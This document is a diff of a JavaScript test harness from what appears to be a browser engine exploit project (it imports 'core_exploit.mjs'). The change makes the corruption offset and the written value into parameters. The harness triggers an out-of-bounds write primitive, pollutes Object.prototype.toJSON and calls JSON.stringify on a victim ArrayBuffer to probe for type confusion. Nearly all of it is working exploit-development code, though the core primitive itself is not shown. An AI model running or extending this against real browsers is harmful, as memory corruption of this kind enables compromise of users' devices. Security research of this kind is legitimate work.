@@ -7,36 +7,35 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG } from '../config.mjs';
 
-const FOCUSED_TEST_PARAMS = {
+const FOCUSED_TEST_PARAMS = { // Mantido para consistência, mas corruption_offset e value_to_write virão como params
     victim_ab_size: 64,
-    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
-    value_to_write: 0xFFFFFFFF,
+    // corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70 // Será passado como parâmetro
+    // value_to_write: 0xFFFFFFFF, // Será passado como parâmetro
     bytes_to_write_for_corruption: 4,
     ppKeyToPollute: 'toJSON',
 };
 
-// Contador global para ser usado pelas variantes de toJSON definidas em runAllAdvancedTestsS3.mjs
 export let currentCallCount_toJSON_for_typeerror_test = 0;
 
 export async function executeTypeErrorInvestigationTest(
     testVariantDescription,
     applyPrototypePollution, // true ou false
-    toJSONFunctionToUse // A função para poluir, se applyPrototypePollution for true
+    toJSONFunctionToUse, // A função para poluir, se applyPrototypePollution for true
+    corruptionOffsetToTest, // Novo: offset específico para este teste
+    valueToWriteToTest      // Novo: valor específico para este teste
 ) {
     const FNAME_TEST = `executeTypeErrorInvestigation<${testVariantDescription}>`;
-    const {
+    const { // Pegar apenas os parâmetros fixos daqui
         victim_ab_size,
-        corruption_offset,
-        value_to_write,
         bytes_to_write_for_corruption,
         ppKeyToPollute,
     } = FOCUSED_TEST_PARAMS;
 
     logS3(`--- Iniciando Teste de Investigação TypeError: ${testVariantDescription} ---`, "test", FNAME_TEST);
-    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, Aplicar PP: ${applyPrototypePollution}`, "info", FNAME_TEST);
+    logS3(`   Offset: ${toHex(corruptionOffsetToTest)}, Valor: ${toHex(valueToWriteToTest)}, Aplicar PP: ${applyPrototypePollution}`, "info", FNAME_TEST);
     document.title = `Iniciando: ${testVariantDescription}`;
 
-    currentCallCount_toJSON_for_typeerror_test = 0; // Reseta o contador para cada teste individual
+    currentCallCount_toJSON_for_typeerror_test = 0; 
 
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
@@ -56,12 +55,12 @@ export async function executeTypeErrorInvestigationTest(
 
     try {
         if (applyPrototypePollution) {
-            logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
+            logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica associada a: ${testVariantDescription}`, "info", FNAME_TEST);
             document.title = `Aplicando PP: ${testVariantDescription}`;
             stepReached = "aplicando_pp";
 
             Object.defineProperty(Object.prototype, ppKeyToPollute, {
-                value: toJSONFunctionToUse, // Usa a lógica fornecida
+                value: toJSONFunctionToUse, 
                 writable: true, configurable: true, enumerable: false
             });
             pollutionAppliedThisRun = true;
@@ -74,10 +73,10 @@ export async function executeTypeErrorInvestigationTest(
             document.title = `PP Desabilitada: ${testVariantDescription}`;
         }
 
-        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
+        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWriteToTest)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruptionOffsetToTest)}`, "warn", FNAME_TEST);
         stepReached = "antes_escrita_oob";
         document.title = `Antes Escrita OOB: ${testVariantDescription}`;
-        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
+        oob_write_absolute(corruptionOffsetToTest, valueToWriteToTest, bytes_to_write_for_corruption);
         logS3("Escrita OOB realizada.", "info", FNAME_TEST);
         stepReached = "apos_escrita_oob";
         document.title = `Após Escrita OOB: ${testVariantDescription}`;
@@ -98,7 +97,7 @@ export async function executeTypeErrorInvestigationTest(
             document.title = `ERRO Stringify (${e.name}): ${testVariantDescription}`;
             errorOccurred = true;
             logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
-            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e); // Log para console do dev
+            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
         }
 
     } catch (mainError) {
@@ -106,7 +105,7 @@ export async function executeTypeErrorInvestigationTest(
         document.title = `ERRO Principal: ${testVariantDescription}`;
         errorOccurred = true;
         logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
-        console.error(mainError); // Log para console do dev
+        console.error(mainError);
     } finally {
         if (pollutionAppliedThisRun) {
             if (originalToJSONDescriptor) {
